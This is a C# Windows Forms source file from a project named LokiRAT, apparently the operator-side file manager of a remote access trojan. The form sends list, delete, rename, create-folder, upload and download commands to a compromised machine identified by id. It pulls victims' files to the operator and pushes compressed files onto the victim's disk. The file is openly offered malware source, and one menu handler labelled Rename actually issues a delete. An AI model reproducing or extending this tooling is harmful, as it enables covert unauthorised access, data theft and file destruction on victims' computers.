namespace LokiRAT
{
    using common;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.IO;
    using System.Net;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public class fileManager : Form
    {
        private ToolStripMenuItem addNewFolderToolStripMenuItem;
        private Button button1;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private ComboBox comboBox1;
        private IContainer components = null;
        private ContextMenuStrip contextMenuStrip1;
        private ContextMenuStrip contextMenuStrip2;
        private ToolStripMenuItem copyPathToolStripMenuItem;
        private ToolStripMenuItem deleteToolStripMenuItem;
        private ToolStripMenuItem deleteToolStripMenuItem2;
        private ToolStripMenuItem downloadToolStripMenuItem1;
        private ImageList imageList1;
        private Label label1;
        private Label label2;
        private ToolStripMenuItem listFilesToolStripMenuItem;
        private ListView listView1;
        private ToolStripMenuItem newFolderToolStripMenuItem;
        private ToolStripMenuItem refreshToolStripMenuItem;
        private ToolStripMenuItem refreshToolStripMenuItem1;
        private ToolStripMenuItem renameToolStripMenuItem;
        private ToolStripMenuItem renameToolStripMenuItem1;
        private ToolStripMenuItem renameToolStripMenuItem2;
        private ToolStripMenuItem renameToolStripMenuItem3;
        private TextBox textBox1;
        private System.Windows.Forms.Timer timer1;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripSeparator toolStripSeparator2;
        private ToolStripSeparator toolStripSeparator3;
        private ToolStripTextBox toolStripTextBox1;
        private ToolStripTextBox toolStripTextBox2;
        private ToolStripTextBox toolStripTextBox3;
        private TreeView treeView1;
        private ToolStripMenuItem uploadToolStripMenuItem1;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(fileManager));
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.treeView1 = new System.Windows.Forms.TreeView();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.renameToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripTextBox2 = new System.Windows.Forms.ToolStripTextBox();
            this.renameToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.listFilesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyPathToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.listView1 = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuStrip2 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.newFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripTextBox1 = new System.Windows.Forms.ToolStripTextBox();
            this.addNewFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripTextBox3 = new System.Windows.Forms.ToolStripTextBox();
            this.renameToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.deleteToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
            this.downloadToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.uploadToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.refreshToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.label1 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.contextMenuStrip1.SuspendLayout();
            this.contextMenuStrip2.SuspendLayout();
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 500;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // treeView1
            // 
            this.treeView1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)));
            this.treeView1.ContextMenuStrip = this.contextMenuStrip1;
            this.treeView1.ImageIndex = 0;
            this.treeView1.ImageList = this.imageList1;
            this.treeView1.Location = new System.Drawing.Point(-2, 33);
            this.treeView1.Name = "treeView1";
            this.treeView1.SelectedImageIndex = 0;
            this.treeView1.Size = new System.Drawing.Size(214, 478);
            this.treeView1.TabIndex = 0;
            this.treeView1.AfterSelect += new System.Windows.Forms.TreeViewEventHandler(this.treeView1_AfterSelect);
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.deleteToolStripMenuItem,
            this.renameToolStripMenuItem1,
            this.toolStripSeparator3,
            this.listFilesToolStripMenuItem,
            this.copyPathToolStripMenuItem,
            this.refreshToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(130, 120);
            // 
            // deleteToolStripMenuItem
            // 
            this.deleteToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("deleteToolStripMenuItem.Image")));
            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
            this.deleteToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
            this.deleteToolStripMenuItem.Text = "Delete";
            this.deleteToolStripMenuItem.Click += new System.EventHandler(this.deleteToolStripMenuItem_Click);
            // 
            // renameToolStripMenuItem1
            // 
            this.renameToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripTextBox2,
            this.renameToolStripMenuItem2});
            this.renameToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("renameToolStripMenuItem1.Image")));
            this.renameToolStripMenuItem1.Name = "renameToolStripMenuItem1";
            this.renameToolStripMenuItem1.Size = new System.Drawing.Size(129, 22);
            this.renameToolStripMenuItem1.Text = "Rename";
            this.renameToolStripMenuItem1.Click += new System.EventHandler(this.renameToolStripMenuItem1_Click);
            // 
            // toolStripTextBox2
            // 
            this.toolStripTextBox2.Name = "toolStripTextBox2";
            this.toolStripTextBox2.Size = new System.Drawing.Size(100, 23);
            // 
            // renameToolStripMenuItem2
            // 
            this.renameToolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("renameToolStripMenuItem2.Image")));
            this.renameToolStripMenuItem2.Name = "renameToolStripMenuItem2";
            this.renameToolStripMenuItem2.Size = new System.Drawing.Size(160, 22);
            this.renameToolStripMenuItem2.Text = "Rename";
            this.renameToolStripMenuItem2.Click += new System.EventHandler(this.renameToolStripMenuItem2_Click);
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(126, 6);
            // 
            // listFilesToolStripMenuItem
            // 
            this.listFilesToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("listFilesToolStripMenuItem.Image")));
            this.listFilesToolStripMenuItem.Name = "listFilesToolStripMenuItem";
            this.listFilesToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
            this.listFilesToolStripMenuItem.Text = "List Files";
            this.listFilesToolStripMenuItem.Click += new System.EventHandler(this.listFilesToolStripMenuItem_Click);
            // 
            // copyPathToolStripMenuItem
            // 
            this.copyPathToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("copyPathToolStripMenuItem.Image")));
            this.copyPathToolStripMenuItem.Name = "copyPathToolStripMenuItem";
            this.copyPathToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
            this.copyPathToolStripMenuItem.Text = "Copy Path";
            this.copyPathToolStripMenuItem.Click += new System.EventHandler(this.copyPathToolStripMenuItem_Click);
            // 
            // refreshToolStripMenuItem
            // 
            this.refreshToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("refreshToolStripMenuItem.Image")));
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
            this.refreshToolStripMenuItem.Text = "Refresh";
            this.refreshToolStripMenuItem.Click += new System.EventHandler(this.refreshToolStripMenuItem_Click);
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "folder.png");
            this.imageList1.Images.SetKeyName(1, "unknown.png");
            this.imageList1.Images.SetKeyName(2, "image-gallery.png");
            this.imageList1.Images.SetKeyName(3, "App.png");
            this.imageList1.Images.SetKeyName(4, "ico_pdf.png");
            this.imageList1.Images.SetKeyName(5, "page_white_text.png");
            this.imageList1.Images.SetKeyName(6, "110916_27832_16_archive_zip_icon.png");
            this.imageList1.Images.SetKeyName(7, "rar.png");
            this.imageList1.Images.SetKeyName(8, "ini.png");
            this.imageList1.Images.SetKeyName(9, "avi.png");
            this.imageList1.Images.SetKeyName(10, "music.gif");
            // 
            // comboBox1
            // 
            this.comboBox1.Items.AddRange(new object[] {
            "C:",
            "D:",
            "G:",
            "F:"});
            this.comboBox1.Location = new System.Drawing.Point(69, 7);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(46, 21);
            this.comboBox1.TabIndex = 1;
            this.comboBox1.Text = "C:";
            this.comboBox1.SelectedIndexChanged += new System.EventHandler(this.comboBox1_SelectedIndexChanged);
            // 
            // listView1
            // 
            this.listView1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader3});
            this.listView1.ContextMenuStrip = this.contextMenuStrip2;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(218, 33);
            this.listView1.MultiSelect = false;
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.Size = new System.Drawing.Size(682, 478);
            this.listView1.SmallImageList = this.imageList1;
            this.listView1.TabIndex = 2;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            this.listView1.SelectedIndexChanged += new System.EventHandler(this.listView1_SelectedIndexChanged);
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "File Name";
            this.columnHeader1.Width = 194;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "File Size";
            this.columnHeader2.Width = 136;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "Last Edit";
            this.columnHeader3.Width = 157;
            // 
            // contextMenuStrip2
            // 
            this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.newFolderToolStripMenuItem,
            this.renameToolStripMenuItem,
            this.deleteToolStripMenuItem2,
            this.toolStripSeparator2,
            this.downloadToolStripMenuItem1,
            this.uploadToolStripMenuItem1,
            this.toolStripSeparator1,
            this.refreshToolStripMenuItem1});
            this.contextMenuStrip2.Name = "contextMenuStrip2";
            this.contextMenuStrip2.Size = new System.Drawing.Size(135, 148);
            // 
            // newFolderToolStripMenuItem
            // 
            this.newFolderToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripTextBox1,
            this.addNewFolderToolStripMenuItem});
            this.newFolderToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("newFolderToolStripMenuItem.Image")));
            this.newFolderToolStripMenuItem.Name = "newFolderToolStripMenuItem";
            this.newFolderToolStripMenuItem.Size = new System.Drawing.Size(134, 22);
            this.newFolderToolStripMenuItem.Text = "New Folder";
            // 
            // toolStripTextBox1
            // 
            this.toolStripTextBox1.Name = "toolStripTextBox1";
            this.toolStripTextBox1.Size = new System.Drawing.Size(100, 23);
            this.toolStripTextBox1.Text = "New Folder";
            // 
            // addNewFolderToolStripMenuItem
            // 
            this.addNewFolderToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("addNewFolderToolStripMenuItem.Image")));
            this.addNewFolderToolStripMenuItem.Name = "addNewFolderToolStripMenuItem";
            this.addNewFolderToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
            this.addNewFolderToolStripMenuItem.Text = "Add New Folder";
            this.addNewFolderToolStripMenuItem.Click += new System.EventHandler(this.addNewFolderToolStripMenuItem_Click);
            // 
            // renameToolStripMenuItem
            // 
            this.renameToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripTextBox3,
            this.renameToolStripMenuItem3});
            this.renameToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("renameToolStripMenuItem.Image")));
            this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
            this.renameToolStripMenuItem.Size = new System.Drawing.Size(134, 22);
            this.renameToolStripMenuItem.Text = "Rename";
            // 
            // toolStripTextBox3
            // 
            this.toolStripTextBox3.Name = "toolStripTextBox3";
            this.toolStripTextBox3.Size = new System.Drawing.Size(100, 23);
            // 
            // renameToolStripMenuItem3
            // 
            this.renameToolStripMenuItem3.Image = ((System.Drawing.Image)(resources.GetObject("renameToolStripMenuItem3.Image")));
            this.renameToolStripMenuItem3.Name = "renameToolStripMenuItem3";
            this.renameToolStripMenuItem3.Size = new System.Drawing.Size(160, 22);
            this.renameToolStripMenuItem3.Text = "Rename";
            this.renameToolStripMenuItem3.Click += new System.EventHandler(this.renameToolStripMenuItem3_Click);
            // 
            // deleteToolStripMenuItem2
            // 
            this.deleteToolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("deleteToolStripMenuItem2.Image")));
            this.deleteToolStripMenuItem2.Name = "deleteToolStripMenuItem2";
            this.deleteToolStripMenuItem2.Size = new System.Drawing.Size(134, 22);
            this.deleteToolStripMenuItem2.Text = "Delete";
            this.deleteToolStripMenuItem2.Click += new System.EventHandler(this.deleteToolStripMenuItem2_Click);
            // 
            // toolStripSeparator2
            // 
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new System.Drawing.Size(131, 6);
            // 
            // downloadToolStripMenuItem1
            // 
            this.downloadToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("downloadToolStripMenuItem1.Image")));
            this.downloadToolStripMenuItem1.Name = "downloadToolStripMenuItem1";
            this.downloadToolStripMenuItem1.Size = new System.Drawing.Size(134, 22);
            this.downloadToolStripMenuItem1.Text = "Download";
            this.downloadToolStripMenuItem1.Click += new System.EventHandler(this.downloadToolStripMenuItem1_Click);
            // 
            // uploadToolStripMenuItem1
            // 
            this.uploadToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("uploadToolStripMenuItem1.Image")));
            this.uploadToolStripMenuItem1.Name = "uploadToolStripMenuItem1";
            this.uploadToolStripMenuItem1.Size = new System.Drawing.Size(134, 22);
            this.uploadToolStripMenuItem1.Text = "Upload";
            this.uploadToolStripMenuItem1.Click += new System.EventHandler(this.UploadToolStripMenuItem1_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(131, 6);
            // 
            // refreshToolStripMenuItem1
            // 
            this.refreshToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("refreshToolStripMenuItem1.Image")));
            this.refreshToolStripMenuItem1.Name = "refreshToolStripMenuItem1";
            this.refreshToolStripMenuItem1.Size = new System.Drawing.Size(134, 22);
            this.refreshToolStripMenuItem1.Text = "Refresh";
            this.refreshToolStripMenuItem1.Click += new System.EventHandler(this.refreshToolStripMenuItem1_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(9, 10);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(60, 13);
            this.label1.TabIndex = 7;
            this.label1.Text = "Local Disc:";
            // 
            // textBox1
            // 
            this.textBox1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.textBox1.Location = new System.Drawing.Point(218, 7);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(608, 20);
            this.textBox1.TabIndex = 10;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(144, 10);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(69, 13);
            this.label2.TabIndex = 12;
            this.label2.Text = "Current Path:";
            // 
            // button1
            // 
            this.button1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button1.Location = new System.Drawing.Point(832, 5);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(64, 22);
            this.button1.TabIndex = 13;
            this.button1.Text = "Open";
            this.button1.UseVisualStyleBackColor = true;
            // 
            // fileManager
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(902, 513);
            this.Controls.Add(this.listView1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.comboBox1);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.treeView1);
            this.Controls.Add(this.button1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "fileManager";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "File Manager";
            this.Load += new System.EventHandler(this.fileManager_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            this.contextMenuStrip2.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        string id;
        string curDownFileName;
        string myLastCommand;

        public fileManager(string id)
        {
            this.InitializeComponent();
            this.id = id;
        }

        public int genImageFile(string filename)
        {
            string[] strArray = new string[0x63];
            strArray = filename.Split(new char[] { '.' });
            switch (strArray[strArray.Length - 1])
            {
                case "png":
                case "jpg":
                case "gif":
                    return 2;

                case "exe":
                    return 3;

                case "pdf":
                    return 4;

                case "txt":
                    return 5;

                case "zip":
                    return 6;

                case "rar":
                    return 7;

                case "ini":
                    return 8;

                case "avi":
                case "mkv":
                case "3gp":
                    return 9;

                case "mp3":
                case "wma":
                    return 10;
            }
            return 1;
        }

        public string genSize(string bytes)
        {
            decimal num = Convert.ToDecimal(bytes);
            if (num < 1024M)
                return (num.ToString() + " Bytes");
            if ((num >= 1024M) && (num < 1048576M))
                return (Math.Round((decimal)(num / 1024M), 2).ToString() + " KB");
            if ((num >= 1048576M) && (num < 1073741824M))
                return (Math.Round((decimal)((num / 1024M) / 1024M), 2).ToString() + " MB");
            return (Math.Round((decimal)(((num / 1024M) / 1024M) / 1024M), 2).ToString() + " GB");
        }

        private void fileManager_Load(object sender, EventArgs e)
        {
            this.myLastCommand = "-1";
            this.treeView1.Nodes.Clear();
            TreeNode node = new TreeNode(this.comboBox1.Text);
            this.treeView1.Nodes.Add(node);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Global.lastCommand[id] != this.myLastCommand)
                {
                    this.myLastCommand = Global.lastCommand[id];

                    string str = Global.GetLastCommandText(id);
                    if (str.Substring(0, 6) == "LSlist")
                    {
                        int num;
                        this.myLastCommand = Global.lastCommand[id];
                        this.treeView1.SelectedNode.Nodes.Clear();
                        string[] strArray2 = Regex.Split(str, "{-fbr}");
                        string[] strArray4 = Regex.Split(strArray2[0], "{-f}");
                        string[] strArray3 = Regex.Split(strArray2[1], "{-f}");
                        for (num = 1; num < (strArray4.Length - 1); num++)
                        {
                            this.treeView1.SelectedNode.Nodes.Add(new TreeNode(strArray4[num]));
                        }
                        this.treeView1.SelectedNode.Expand();
                        this.listView1.Items.Clear();
                        for (num = 0; num < (strArray3.Length - 1); num++)
                        {
                            string[] infos = Regex.Split(strArray3[num], "{-fi}");
                            ListViewItem item = this.listView1.Items.Add(infos[0]);
                            item.ImageIndex = this.genImageFile(infos[0]);
                            item.SubItems.Add(this.genSize(infos[1]));
                            item.SubItems.Add(infos[2]);
                        }
                    }
                    else if ((((str.Substring(0, 8) == "RSdelete") || (str.Substring(0, 10) == "RScreatdir")) || (str.Substring(0, 10) == "RSdownload")) || (str.Substring(0, 8) == "RSrename"))
                    {
                        Global.AddCommandToList(id, "list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
                    }
                    else if (str.Substring(0, 8) == "LSupload")
                    {
                        string fileUploadFilename = this.treeView1.SelectedNode.FullPath + "\\" + curDownFileName;
                        string[] rets = Regex.Split(str, "{-}");
                        SaveFileDialog sfd = new SaveFileDialog();
                        sfd.FileName = curDownFileName;
                        sfd.Filter = "All Files|*.*";
                        if (sfd.ShowDialog() == DialogResult.OK)
                        {
                            File.WriteAllBytes(sfd.FileName, gzip.Decompress(utils.GetStringToBytes(rets[1])));
                        }
                    }
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void addNewFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Global.AddCommandToList(id, "creatdir|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.toolStripTextBox1.Text + "/");
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            this.treeView1.Nodes.Clear();
            TreeNode node = new TreeNode(this.comboBox1.Text);
            this.treeView1.Nodes.Add(node);
        }

        private void copyPathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(this.treeView1.SelectedNode.FullPath);
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Global.AddCommandToList(id, "delete|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void deleteToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                Global.AddCommandToList(id, "delete|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.listView1.SelectedItems[0].Text);
            }
            catch
            {
                MessageBox.Show("You must select file first!", "Select file | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void downloadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                curDownFileName = this.listView1.SelectedItems[0].Text;
                Global.AddCommandToList(id, "upload|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + curDownFileName);
            }
            catch
            {
                MessageBox.Show("You must select file first!", "Select file | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void UploadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                Global.AddCommandToList(id, "download|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + ofd.FileName.Substring(ofd.FileName.LastIndexOf(@"\") + 1) + "|"
                    + utils.GetBytesToString(gzip.Compress(File.ReadAllBytes(ofd.FileName))));
            }
        }

        private void listFilesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Global.AddCommandToList(id, "list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count > 0)
                this.toolStripTextBox3.Text = this.listView1.SelectedItems[0].Text;
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Global.AddCommandToList(id, "list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Global.AddCommandToList(id, "list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void renameToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Global.AddCommandToList(id, "delete|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
        }

        private void renameToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            Global.AddCommandToList(id, "rename|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/|" + this.treeView1.SelectedNode.FullPath.Substring(0, this.treeView1.SelectedNode.FullPath.LastIndexOf(@"\")).Replace(@"\", "/") + "/" + this.toolStripTextBox2.Text);
        }

        private void renameToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            Global.AddCommandToList(id, "rename|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.listView1.SelectedItems[0].Text + "|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/" + this.toolStripTextBox3.Text);
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            this.listView1.Items.Clear();
            this.textBox1.Text = this.treeView1.SelectedNode.FullPath + @"\";
            Global.AddCommandToList(id, "list|" + this.treeView1.SelectedNode.FullPath.Replace(@"\", "/") + "/");
            this.toolStripTextBox2.Text = this.treeView1.SelectedNode.FullPath.Substring(this.treeView1.SelectedNode.FullPath.LastIndexOf(@"\") + 1);
        }
    }
}